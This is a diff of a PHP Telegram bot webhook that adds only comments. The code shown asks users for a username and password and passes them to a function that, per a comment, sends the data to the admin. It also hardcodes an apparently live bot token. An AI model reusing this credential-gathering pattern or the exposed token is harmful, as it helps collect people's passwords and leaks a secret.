@@ -1,15 +1,25 @@
 <?php
+
+// Error Logs
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
+
+// Load Libraries
 require_once 'vendor/autoload.php';
+
+// Get Webhook Telegram
 $command = file_get_contents("php://input");
 $json = json_decode($command, true);
 $headers = ['Accept' => 'application/json'];
+
+// Get Data
 $id = $json['message']['from']['id'];
 $username = $json['message']['from']['username'];
 $text = $json['message']['text'];
 $MID = $json['message']['message_id'];
 $callback = $json['callback_query']['data'];
+
+// Your Bot Token
 $botToken = '625923840:AAG0wtK64xgTK2JULcLAU4VC9I_hQsleCcM';
 
 function sendToTelegram($text)
@@ -83,6 +93,7 @@ function usernamePassword()
     fclose($info);
 }
 
+// Start
 if ($text == '/start') {
     $text = [
         'chat_id' => $id,
@@ -119,7 +130,7 @@ if ($text == '/start') {
         ])
     ];
     sendToTelegram($text);
-} else if ($text == '/Username') {
+} else if ($text == '/Username') { // Get Username
     $myfile = fopen("isIt.txt", "w");
     $nextNumber = 1;
     fwrite($myfile, $nextNumber);
@@ -130,7 +141,7 @@ if ($text == '/start') {
         'parse_mode' => 'html',
     ];
     sendToTelegram($sendUser);
-} else if ($text == '/Password') {
+} else if ($text == '/Password') { // Get Password
     $myfile = fopen("isIt.txt", "w");
     $nextNumber = 2;
     fwrite($myfile, $nextNumber);
@@ -196,6 +207,8 @@ if ($text == '/start') {
             'parse_mode' => 'html',
         ];
         sendToTelegram($ThanksText);
+
+        // Send Data for Admin
         usernamePassword();
     }
     fclose($f);
